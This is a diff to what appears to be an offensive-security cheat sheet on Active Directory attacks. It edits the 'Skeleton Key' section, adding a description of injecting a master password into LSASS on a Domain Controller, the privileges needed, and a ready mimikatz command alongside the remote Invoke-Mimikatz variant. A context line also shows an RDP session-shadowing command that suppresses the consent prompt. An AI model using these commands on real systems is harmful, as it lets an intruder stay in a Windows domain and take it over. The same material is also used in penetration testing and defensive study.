@@ -478,8 +478,14 @@ mstsc /v:{ADDRESS} /shadow:{SESSION_ID} /noconsentprompt /prompt
 
 ### Skeleton Key
 
+> Inject a master password into the LSASS process of a Domain Controller.
+
+Requirements:
+* Domain Administrator (SeDebugPrivilege) or `NTAUTHORITY\SYSTEM`
+
 ```powershell
-# Exploitation Command runned as DA:
+# Execute the skeleton key attack
+mimikatz "privilege::debug" "misc::skeleton"
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DCs FQDN>
 
 # Access using the password "mimikatz"
